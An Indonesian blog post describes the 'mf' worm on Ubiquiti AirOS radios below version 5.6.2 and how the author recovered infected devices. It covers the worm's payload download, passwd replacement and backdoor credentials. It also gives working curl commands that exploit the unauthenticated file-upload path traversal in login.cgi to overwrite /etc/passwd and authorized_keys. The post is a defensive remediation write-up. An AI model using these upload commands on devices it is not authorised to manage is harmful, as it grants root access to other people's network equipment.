<!DOCTYPE html>
<html lang="id">
  <head>
        <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=endge, chrome=IE8" />
    <meta name="viewport" content="initial-scale=1.0, width=device-width, user-scalable=no" />
    <title>Virus Ubiquiti v5.5.x error "Invalid Credentials" — DevNull</title>
    <!--[if lte IE 8]><script type="text/javascript" src="../theme/js/html5shiv.js"></script><![endif]-->
    <link rel="stylesheet" type="text/css" href="../theme/css/skeleton.css" />
    <link href='https://fonts.googleapis.com/css?family=Roboto:300,300italic,700,700italic|Open+Sans:300italic,300,700,700italic' rel='stylesheet' type='text/css' />
    <link rel="stylesheet" type="text/css" href="../theme/css/theme.css" />
    <link rel="stylesheet" type="text/css" href="../theme/css/pastie.css" />
<!--    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700,700italic,400italic,300,300italic' rel='stylesheet' type='text/css' /> -->
    <link rel="shortcut icon" type="image/png" href="../favicon.png" />
    <!--[if lte IE 8]><link rel="shortcut icon" type="image/x-icon" href="../favicon.ico" /><![endif]-->
    <link rel="alternate" type="application/atom+xml"
                           title="DevNull — Flux Atom"
                           href="http://feeds.feedburner.com/blog/devnull" /> 

    <meta name="author"   content="Dhani Setiawan" />
    <meta name="keywords" content="Linux, Networking" />
    <link rel="stylesheet" media="not print" type="text/css" href="../theme/css/pygments.css" /> 
  </head>
  <body>
    <div id="page">
      <header id="page-head">
        <h1>
          <a href="../index.html">DevNull</a>
        </h1>
      </header>
      
      <div id="page-body">
        <article class="post" id="page-main" role="main">
      <header class="post-header">
        <h1>
          <a rel="bookmark"
             href="../misc/ubnt-virus-exploit.html"
             title="Bookmarks «Virus Ubiquiti v5.5.x error "Invalid Credentials"»">
             Virus Ubiquiti v5.5.x error "Invalid Credentials"
          </a>
        </h1>
        <div class="meta">
<!-- includes/article_meta.html -->
            Published by <a href="../author/dhani-setiawan.html">Dhani Setiawan</a>
            on <time datetime="2016-06-08T14:35:00+08:00">Wed 08 June 2016</time>
            <br />Filed under: <a href="../category/misc.html">Misc</a>              Tags:              <a rel="tag" href="../tag/linux.html">Linux</a>,               <a rel="tag" href="../tag/networking.html">Networking</a>        </div>
      </header>
      <div class="post-content"> 
        <p>Beberapa hari lalu kami dibuat pusing karena tiba-tiba saja banyak perangkat radio Ubiquiti tidak bisa diakses. Kalau coba login ke perangkat-perangkat itu muncul pesan error &ldquo;Invalid Credentials&rdquo; yang berarti username atau password tidak valid.</p>
<p>Tidak ada satu pun manusia yang merubah password. Lagi pula perangkat yang error itu jumlahnya banyak, jadi kecil kemungkinan password dirubah secara manual dengan waktu yang hampir bersamaan. Karena itu dugaan saya pertama kali ini pasti lewat scripting.</p>
<p>Barangkali di antara rekan-rekan ada yang juga mengalami hal ini, ini karena virus yang menamakan dirinya <em>mf</em> (motherfu**er), nama virus yang sama sekali tidak keren. Ciri-cirinya, sebagian kasus halaman login web bisa dibuka tapi gagal login. Sebagian kasus lainnya halaman login web tidak bisa dibuka tapi perangkat router atau radio itu reply kalau di-ping. untuk yang terakhir ini akses cuma bisa lewat ssh.</p>
<p>Normalnya, kalau username dan password perangkat sudah berubah dan tidak bisa diakses lagi, berarti harus reset ke konfigurasi default. Ini yang buat saya agak sedikit horor karena banyaknya jumlah perangkat radio yang harus direset. Untungnya cara ini tidak perlu diambil.</p>
<p>Saya kemudian coba cari-cari di database bug Ubiquiti AirMAX barangkali ada bug AirOS yang jadi sumber malapetaka ini. Benar saja, di HackerOne ada bug yang tergolong baru dan bug ini bisa dieksploitasi untuk bypass autentikasi.</p>
<p>Sebelumnya kalau rekan-rekan ada yang belum tahu AirOS, ini OS embedded untuk perangkat jaringan (Radio dan router) Ubiquiti. OS ini pakai kernel Linux yang dibuat dari OpenWRT.</p>
<p>Bug ini karena tidak adanya boundscheck untuk verifikasi user input lewat webserver lighttpd. Attacker bisa eksploitasi bug ini dengan upload file tanpa autentikasi. Parahnya lagi, file yang diupload itu bisa ditempatkan di mana saja karena punya hak akses root.</p>
<p>Bayangkan saja kalau yang diupload itu <code>ssh public key</code> atau file <code>passwd</code>. File <code>passwd</code> bisa buat overwrite file <code>/etc/passwd</code>, si attacker bisa login tanpa perlu autentikasi. Apa bukan mimpi buruk ini namanya, heh?</p>
<p>Saya lihat log bug ini di HackerOne, penemu bug ini dapat ganjaran 18.000 dolar dari Ubiquiti, whew&hellip;!<br />
Ubiquiti kemudian menutup bug ini di AirOS versi 5.6.2.</p>
<p>&nbsp;</p>
<p>Kembali ke virus <em>motherfucker</em> yang mengeksploitasi bug ini.</p>
<h3 id="apa-yang-dilakukan-virus-ini">Apa yang dilakukan virus ini?</h3>
<p>Virus ini di awal-awal akan download virus dari <a href="http://pastebin.com/raw/heNFjBVK" target="_blank">http://pastebin.com/raw/heNFjBVK</a> terus extract virus mf.tgz ke direktori <code>/etc/persistent</code> terus buat direktori hidden <code>/etc/persistent/.mf</code>. Virus ini kemudian menghapus user <code>ubnt</code>, mengganti file <code>/etc/passwd</code> dengan file <code>passwd</code> versi virus.</p>
<p>Ada user baru di <code>passwd</code> dengan nama user <code>moth3r</code> dan password hash <code>$1$RpWdAhdc$cNgp9llO5jKApRaG8b4nK1</code>. Belakangan diketahui password hash itu <code>fuck.3r</code>, seseorang di belahan bumi yang lain berhasil brut force hash itu pakai <em>John the Ripper</em>.</p>
<p>Selanjutnya virus ini merubah mode wireless ke master, mengganti ssid, disable dhcp server, dan disable tombol reset. Untungnya semua itu gagal, jadi tidak ada yang terubah.</p>
<p>Virus ini menyebar dengan melihat <code>ip neighbor</code> dan menyebar ke perangkat yang bertetangga dengan perangkat yang terinfeksi itu.</p>
<p>Siapa yang vulnerable dengan virus ini? mereka adalah perangkat radio atau router Ubiquiti AirMAX yang pakai OS dibawah 5.6.2.</p>
<p>&nbsp;</p>
<h3 id="cara-hapus-virus">Cara hapus virus</h3>
<p>Cara paling gampang kalau bisa login ssh ke router pakai username <code>moth3r</code> dan password <code>fuck.3r</code>. Dari sini hapus direktori <code>/etc/persistent/.mf</code> sama <code>/etc/persistent/rc.poststart</code>.</p>
<div class="codehilite"><pre><span></span><span class="err">for i in $(ps | grep mf | awk &#39;{print $1}&#39; | sed &#39;s/ //&#39;); do kill $i; done</span>
<span class="err">rm -rf /etc/persistent/.mf</span>
<span class="err">rm -f /etc/persistent/rc.poststart</span>
<span class="err">cfgmtd -w -f /tmp/system.cfg -p /etc/</span>
<span class="err">reboot</span>
</pre></div>


<p>Masalahnya, ada sebagian perangkat yang user dan password itu invalid. Jadi kita tidak tahu apa passwordnya, jadi kita harus cari cara yang lain.</p>
<p>Kita bisa login kembali ke perangkat Ubiquiti itu dengan cara yang sama yang dipakai exploit. saya pakai file <code>passwd</code> sama file <code>ssh public key</code>.</p>
<p><strong>1) user di file passwd</strong><br />
Kita bisa pakai file <code>passwd</code> dari mana saja. Yang di bawah ini juga bisa dipakai.</p>
<div class="codehilite"><pre><span></span><span class="n">blah</span><span class="o">:</span><span class="n">Ddc96rtq5NYfG</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="n">Administrator</span><span class="o">:/</span><span class="n">etc</span><span class="sr">/persistent:/bin/s</span><span class="n">h</span>
<span class="n">ubnt</span><span class="o">:</span><span class="n">IXpEhRnqWrjjI</span><span class="o">:</span><span class="mi">100</span><span class="o">:</span><span class="mi">100</span><span class="o">:</span><span class="n">Administrator</span><span class="o">:/</span><span class="n">etc</span><span class="sr">/persistent:/bin/</span><span class="kc">false</span>
</pre></div>


<p>Tidak penting apa passwordnya karena nantinya kita login pakai ssh key.</p>
<p><strong>2) Buat ssh key</strong><br />
Ssh key bisa dibuat pakai command <code>ssh-keygen</code>, passphrase kosong saja biar nantinya bisa login tanpa password.</p>
<div class="codehilite"><pre><span></span><span class="err">Endor &gt; ssh-keygen -t rsa -C &quot;blah@blah.com&quot;</span>
<span class="err">Generating public/private rsa key pair.</span>
<span class="err">Enter file in which to save the key (/home/user/.ssh/id_rsa): blah_rsa</span>
<span class="err">Enter passphrase (empty for no passphrase): </span>
<span class="err">Enter same passphrase again: </span>
<span class="err">Your identification has been saved in blah_rsa.</span>
<span class="err">Your public key has been saved in blah_rsa.pub.</span>
<span class="err">The key fingerprint is:</span>
<span class="c">ff:98:31:3b:3b:ec:70:8f:3c:34:6b:09:e0:2b:f4:d6 blah@blah.com</span>
<span class="err">The key&#39;s randomart image is:</span>
<span class="err">+---[RSA 2048]----+</span>
<span class="err">|                 |</span>
<span class="err">|                 |</span>
<span class="err">|                 |</span>
<span class="err">|      .          |</span>
<span class="err">|     . .S        |</span>
<span class="err">|    . . ..o      |</span>
<span class="err">|   . . o.+=+     |</span>
<span class="err">|    . + E+OX     |</span>
<span class="err">|     o   oO=o    |</span>
<span class="err">+-----------------+</span>
<span class="err">Endor &gt;</span>
</pre></div>


<p><strong>3) Upload file passwd dan ssh public key</strong><br />
Di sini bug itu, kita bisa seenaknya upload file terus tempatkan file itu di mana saja tanpa perlu autentikasi. Fatal kan?</p>
<div class="codehilite"><pre><span></span><span class="err">curl -F &quot;file=@passwd;filename=../../etc/passwd&quot; -H &quot;Expect:&quot; &quot;https://192.168.1.20/login.cgi&quot; -k</span>
<span class="err">curl -F &quot;file=@blah_rsa.pub;filename=../../etc/dropbear/authorized_keys&quot; -H &quot;Expect:&quot; &quot;https://192.168.1.20/login.cgi&quot; -k</span>
</pre></div>


<p>Ip address 192.168.1.20 itu contoh saja.</p>
<p>Kemudian coba login ssh</p>
<div class="codehilite"><pre><span></span><span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">blah_rsa</span> <span class="n">blah</span><span class="mf">@192.168.1.20</span>
</pre></div>


<p>Saya berhasil login pakai ssh key, fiuhh..!! rasanya lega sekali.</p>
<p><strong>4) Hapus virus</strong><br />
Sebelum hapus virus, kita harus kill dulu semua proses yang ada hubungannya sama mf.</p>
<div class="codehilite"><pre><span></span><span class="err">for i in $(ps | grep mf | awk &#39;{print $1}&#39; | sed &#39;s/ //&#39;); do kill $i; done</span>
<span class="err">rm -rf /etc/persistent/.mf</span>
<span class="err">rm -f /etc/persistent/rc.poststart</span>
</pre></div>


<p>Masih di shell Ubiquiti, kembalikan password ke default</p>
<div class="codehilite"><pre><span></span><span class="err">/usr/bin/sed -i &#39;s/users\.1\.password=.*/users\.1\.password=35YnFRwmUdGzc/&#39; /tmp/system.cfg</span>
<span class="err">cfgmtd -w -f /tmp/system.cfg -p /etc/</span>
<span class="err">reboot</span>
</pre></div>


<p>Lokasi <code>sed</code> kalau di Ubiquiti AirOS memang di <code>/usr/bin/sed</code>, beda sama kebanyakan Linux yang <code>sed</code> nya ada di <code>/bin/sed</code>.</p>
<p>Setelah selesai reboot, kita bisa login ke router pakai password default &ldquo;<code>ubnt</code>&rdquo; terus upgrade ke firmware yang baru.</p>
<p>Selain di atas, ada cara lain lagi yang bisa diambil.<br />
Virus ini awal-awal masuk ke router, dia bakalan download <code>curl</code> dari <a href="http://downloads.openwrt.org" target="_blank">http://downloads.openwrt.org</a> dan <a href="http://bo.mirror.garr.it/mirrors/openwrt" target="_blank">http://bo.mirror.garr.it/mirrors/openwrt</a>. Kita bisa buat file <code>curl</code> palsu yang isinya script buat hapus virus. Jadi waktu virus itu coba download <code>curl</code> dari openwrt.org, kita alihkan supaya download dari web server lokal yang isinya file <code>curl</code> palsu. Begitu virus ini eksekusi <code>curl</code>, yang ada bukannya menginfeksi tetangganya tapi malah bunuh diri.</p>
<p>&nbsp;</p>
<p>Virus ini sudah mendunia, di forum Ubiquiti ada yang mengaku punya ribuan perangkat yang terinfeksi dalam semalam saja. saya membayangkannya saja seperti mimpi buruk, apalagi mengalaminya. Saran, kalau teman-teman punya Ubiquiti dengan firmware dibawah 5.6.2 dan belum kena, segera saja upgrade ke firmware baru.</p>
<p>&nbsp;</p>
<p><strong>Info:</strong><br />
Tulisan ini salah satu sumbernya saya ambil dari situs www.exploit-db.com. IDWebhost yang jadi hosting provider blog ini ternyata punya policy tidak boleh nge-link ke situs yang ada kata &ldquo;exploit&rdquo;.</p>
<p>Saya chatting panjang kali lebar dengan support IDWebhost karena begitu tulisan ini online malah tidak bisa diakses dengan kode 404, ternyata penyebabnya karena link itu.</p>
<p>Jadi source-nya yang untuk exploit-db sedikit saya sensor. Rubah <code>https://www.exploxx-db.com/exploxxx/39853/</code> ke <code>https://www.exploit-db.com/exploits/39853/</code>.</p>
<p>&nbsp;</p>
<p><strong>Source:</strong>  </p>
<ul>
<li><a href="https://www.exploxx-db.com/exploxxx/39853/" target="_blank">https://www.exploit-db.com/exploits/39853/</a></li>
<li><a href="https://hackerone.com/reports/73480" target="_blank">https://hackerone.com/reports/73480</a></li>
<li><a href="http://www.securityweek.com/worm-infects-many-ubiquiti-devices-old-vulnerability" target="_blank">http://www.securityweek.com/worm-infects-many-ubiquiti-devices-old-vulnerability</a></li>
</ul>
<p>&nbsp;</p>
<p><strong>Cerita lainnya:</strong><br />
<a href="//devnull.web.id/networking/pengenalan-ipv6.html">&ldquo;Hampir&rdquo; Semua Tentang IPv6</a><br />
<em>Tulisan tentang IPv6 yang berusaha komprehensif tapi ternyata gagal membahas semua hal tentang IPv6. “Hampir” Semua Tentang IPv6, dari sejarah, kelebihan IPv6, sampai pengalamatannya.</em></p>
<p><a href="//devnull.web.id/openstack/pengenalan-openstack.html">Membumikan OpenStack</a><br />
<em>This is a story about How I Met <s>Your Mother</s> OpenStack, ditulis dengan Layman&rsquo;s term.</em></p>
      </div>
        <br />
<section id="ending">
        <div id="share">
<!--    <p id="post-share-links"> -->
            Sebarkan artikel ini :<br /> 
                  <a href="http://twitter.com/home?status=b'Virus%20Ubiquiti%20v5.5.x%20error%20%22Invalid%20Credentials%22%20https%3A//devnull.web.id/misc/ubnt-virus-exploit.html'" target="_blank" title="Share on Twitter">
                        <img src="/images/social/twitter.png" />
                  </a>
                  <a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//devnull.web.id/misc/ubnt-virus-exploit.html" target="_blank" title="Share on Facebook">
                        <img src="/images/social/facebook.png" />
                  </a>
                  <a href="https://plus.google.com/share?url=https%3A//devnull.web.id/misc/ubnt-virus-exploit.html" target="_blank" title="Share on Google Plus">
                        <img src="/images/social/google-plus.png" />
                  </a>
                  <a href="mailto:?subject=Virus%20Ubiquiti%20v5.5.x%20error%20%22Invalid%20Credentials%22&amp;body=https%3A//devnull.web.id/misc/ubnt-virus-exploit.html" target="_blank" title="Share via Email">
                        <img src="/images/social/email.png" />
                  </a>
        </div>
        <br />
</section>
      <footer class="post-footer">
      <br />
      <hr />
<!--
      <div class="meta">
            Categories «<a href="../category/misc.html">Misc</a>» 
            by <a href="../author/dhani-setiawan.html">Dhani Setiawan</a><br />
            Mots-clés:  #<a href="../tag/linux.html">Linux</a> #<a href="../tag/networking.html">Networking</a>        </div>
-->

        <form style="border:1px solid #ccc;padding:3px;text-align:center;" 
                action="https://feedburner.google.com/fb/a/mailverify" method="post" 
                target="popupwindow" onsubmit="window.open('https://feedburner.google.com/fb/a/mailverify?uri=blog/devnull', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true">
                <p>Anda tidak perlu repot-repot mengunjungi blog ini.<br />
                Silahkan masukkan alamat email dan begitu ada post baru, Saya akan minta robot FeedBurner mengantarkannya ke email inbox Anda.</p>
                <p><input type="text" style="width:140px" name="email"/></p>
                <input type="hidden" value="blog/devnull" name="uri"/>
                <input type="hidden" name="loc" value="en_US"/>
                <input type="submit" value="Berlangganan" />
                <p>Delivered by <a href="https://feedburner.google.com" target="_blank">FeedBurner</a></p>
        </form>
        <br />
      </footer>

      <div id="disqus_thread"></div>
        <script type="text/javascript">
            /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
            var disqus_shortname = 'dhani-devnull'; // required: replace example with your forum shortname

            /* * * DON'T EDIT BELOW THIS LINE * * */
            (function() {
                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
        <a href="//disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
      </article> <!-- /#page-main -->

        <aside id="page-side">
          <!-- begin includes/sidebar.html -->
          <nav>
            <h3>Pages</h3>
            <ul>
<!--              <li><a href="..">Accueil</a></li> -->
              <li><a href="../categories.html">Categories</a></li>
              <li><a href="../tags.html">Tags</a></li>
              <li><a href="../archives.html">Archives</a></li>
            </ul>
          </nav>

          <nav>
            <h3>Categories</h3>
            <ul>
              <li><a href="../category/debian.html">Debian</a></li>
              <li><a href="../category/esai.html">Esai</a></li>
              <li><a href="../category/how-to.html">How-to</a></li>
              <li><a href="../category/linux-padawan.html">Linux Padawan</a></li>
              <li class="active"><a href="../category/misc.html">Misc</a></li>
              <li><a href="../category/networking.html">Networking</a></li>
              <li><a href="../category/openstack.html">OpenStack</a></li>
              <li><a href="../category/programming.html">Programming</a></li>
            </ul>
          </nav>

          <nav>
            <h3>Links</h3>
            <ul>
<!--            
-->
                <li><a href="/pages/subscribe.html">Berlangganan artikel</a></li>
              <li><a href="https://github.com/dhanist" target="_blank">GitHub</a></li>
              <li><a href="https://plus.google.com/+DhaniSetiawanYoda" target="_blank">Google+</a></li>
              <li><a href="http://www.transkon.net.id" target="_blank">Transkon-Net</a></li>
              <li><a href="https://www.debian.org/" target="_blank">Debian</a></li>
              <li><a href="https://www.openstack.org" target="_blank">OpenStack</a></li>
            </ul>
          </nav>
          <!-- end includes/sidebar.html --></aside> <!-- /#page-side -->
      </div>  <!-- /#page-body -->

      <footer id="page-foot">
        <p> &copy; Dhani Setiawan. <a href="http://devnull.web.id">devnull.web.id</a> is powered by <a href="http://getpelican.com" target="_blank">Pelican</a> and <a href="https://github.com/getpelican/pelican-themes/tree/master/dev-random2" target="_blank">dev-random2</a> theme</p>
      </footer>
    </div> <!-- /#page -->
  </body>
</html>